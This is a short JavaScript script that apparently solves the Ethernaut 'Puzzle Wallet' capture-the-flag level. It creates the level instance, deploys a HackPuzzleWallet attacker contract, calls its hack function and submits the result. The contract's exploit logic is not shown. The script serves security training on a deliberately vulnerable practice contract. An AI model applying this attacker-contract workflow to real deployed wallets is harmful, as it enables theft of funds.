module.exports = async function({ artifacts, web3, ethernaut }) {
  const HackPuzzleWallet = artifacts.require('HackPuzzleWallet');
  const instanceAddress = await ethernaut.createInstance(web3, 'Puzzle Wallet', { value: web3.utils.toWei('0.001', 'ether') });
  console.log('Created instance at', instanceAddress);

  const hackInstance = await HackPuzzleWallet.new(instanceAddress);
  await hackInstance.hack({ value: web3.utils.toWei('0.001', 'ether') });

  return ethernaut.submitInstance(web3, instanceAddress);
};